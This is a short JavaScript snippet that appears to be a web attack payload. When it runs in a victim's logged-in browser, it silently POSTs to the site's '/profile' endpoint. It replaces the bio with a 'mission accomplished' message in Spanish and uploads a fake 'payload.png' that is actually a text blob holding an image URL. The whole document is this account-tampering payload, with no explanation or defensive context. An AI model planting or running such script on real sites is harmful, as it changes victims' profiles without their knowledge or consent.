(async () => {
  const imageUrl = 'https://i.imgur.com/h15H0EH.png';
  const bioText = 'Misión cumplida. Lo logramos.';

  const fakeFile = new Blob([imageUrl], {type: 'image/png'});

  const formData = new FormData();
  formData.append('bio', bioText);

  formData.append('profile_pic', fakeFile, 'payload.png');

  await fetch('/profile', {
    method: 'POST',
    body: formData
  });
})();
